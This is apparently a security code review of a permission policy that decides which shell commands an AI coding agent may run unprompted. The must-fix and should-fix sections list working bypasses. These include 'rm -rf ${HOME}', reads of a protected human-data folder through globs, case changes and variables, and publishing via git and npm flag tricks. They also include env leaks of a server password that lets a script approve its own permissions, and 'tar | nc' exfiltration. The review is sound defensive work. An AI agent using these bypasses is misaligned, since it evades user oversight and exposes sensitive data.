# Review: agent autonomy (claude/agent-autonomy @ 570ba74)

Verdict: **not yet**. Child-session routing is sound; the policy has cheap regex holes that turn
"ask" items into silent allows, including one destructive case.

Probed `classifyPermission` directly (esbuild bundle of permission-policy.ts, ctx = defaultPolicyContext).

## Must-fix
1. `rm -rf ${HOME}` → **allow**; `cp x ${HOME}/foo` → allow. `${HOME}` / `${VAR}` / `$VAR/...` are not
   path tokens (permission-policy.ts:155, rule :121 only knows `$HOME`). Treat any `$`/`${` expansion
   in a path position (and `$(`/backticks) as outside → ask.
2. Sensitive dirs bypassed by trivial forms, all **allow**: `cd human-data && cat a.csv`, `cat h*/a.csv`,
   `cat human-dat?/a.csv`, `D=human-data; cat $D/a.csv`, `cat HUMAN-DATA/a.csv` (APFS is case-insensitive;
   :87-90 compare case-sensitively), `find . -path "*human*" -exec cat {} +`. Fix: case-insensitive
   match; treat a bare word equal to a sensitive dir name as a path; a glob whose base could expand into
   a sensitive dir → ask.
3. Publishing rules bypassed (**allow**): `git -C . push`, `git -c k=v push`, `git config alias.p push && git p`
   (:113); `npm --registry x publish` (:115); `rsync -a . host:/x` (:116 — `\b` after `:` fails before `/`).
4. Docs overstate the guarantee. `python3 x.py` / `bash .humanstudy/tmp/x.sh` are allowed and edits of
   in-project files are allowed with no content check, so write-then-run reads `human-data/` and posts it
   anywhere without a prompt (e.g. `open('hum'+'an-data/a.csv')` + urllib → allow). Before this branch
   every non-read-only bash asked, so this is new exposure. docs/agent-autonomy.md "Known limits" should
   say plainly that the folder protection only holds against a cooperative model, not a prompt-injected
   one. Real fix: an OS sandbox (sandbox-exec) on the agent's bash denying sensitive dirs. Owner decision.

## Should-fix
- Allowed roots: `kernelHome/data` (:49) covers OpenCode's whole storage, so other projects' transcripts
  (which may quote sensitive material) are readable with no prompt. Narrow it to `data/opencode/tool-output`.
  `/var/folders` is broad too.
- Env leaks (**allow**): `ps eww`, `env -0`, `declare -p`, bare `export`, `echo $OPENCODE_CONFIG_CONTENT`
  (holds the local transport token). With the relay on, keys are stripped, but `OPENCODE_SERVER_PASSWORD`
  stays (opencode.ts:666): a script can call the local server and answer its own permission requests.
  This was already true before this branch, but it now needs no prompt.
- In-project `opencode.json` / `.opencode/plugin/*.ts` are freely editable (also before this branch).
  A project-level `agent.*.permission` or a plugin may bypass the inline config. Treat these paths as ask.
- `tar cz . | nc host 80` is allowed (no nc/ncat/socat/telnet rule). It does not reach sensitive dirs
  unless combined with item 2.
- useSession.ts: `subagents` is reset only on send (:294), not on newThread/openThread/project switch.
  A stale list can show on another build thread.

## Correctness (OK)
- Permission replies use `permissionSession` to reach the child (reply/autoApprove/autoDeny). Questions
  are id-scoped (`/question/:id/reply`) on the same server. Snapshot recovery filters by `rootOf`.
- Child wait states reach the parent as permission/question events, so notify.ts and index.ts activeTurns
  and App's `agentWaiting` work unchanged. A subagent step → `tool` in paper-build keeps the
  checkResult shape.
- Policy deny = reject + message, so the turn continues, and `policyDenied` keeps it from cancelling recovery.
- Cross-project: session ids are global and lookupChild uses the emitting server. The maps are size-capped.
- doom_loop auto-allow: the security impact is small, because each repeated tool call still gets its own
  permission check. But it removes the only loop breaker, so the cost risk is unbounded. Suggest allowing
  N times per turn, then asking.

## Tests
- `npm run typecheck`: pass.
- node --test, all 61 test files except runtime.test.mjs: 226/229.
  - `native-live` fails (needs HUMANSTUDY_KERNEL_BIN, environment).
  - `sim-run-state` fails under parallel load and passes alone (flaky, file untouched by this branch).
  - `runtime.test.mjs` hangs (another session's run hangs on it too). Untouched by this branch, so not
    caused by it.
  - New permission-policy, subagent and account tests: 15/15.
